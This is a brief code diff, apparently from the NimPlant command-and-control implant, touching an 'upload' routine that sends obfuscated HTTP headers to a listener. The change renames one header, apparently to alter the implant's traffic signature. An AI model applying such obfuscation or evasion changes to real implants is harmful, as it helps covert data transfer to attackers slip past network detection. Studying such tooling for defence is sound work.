@@ -40,7 +40,7 @@ proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
         headers: @[
                 Header(key: obf("User-Agent"), value: li.userAgent),
                 Header(key: obf("Some-Identifier"), value: li.id), # Nimplant ID
-                Header(key: obf("X-Unique-ID"), value: cmdGuid),  # Task GUID
+                Header(key: obf("X-ID-Unique"), value: cmdGuid),  # Task GUID
                 Header(key: obf("X-Header"), value: li.xHeader),
             Header(key: obf("X-ID"), value: li.xID)
             ],
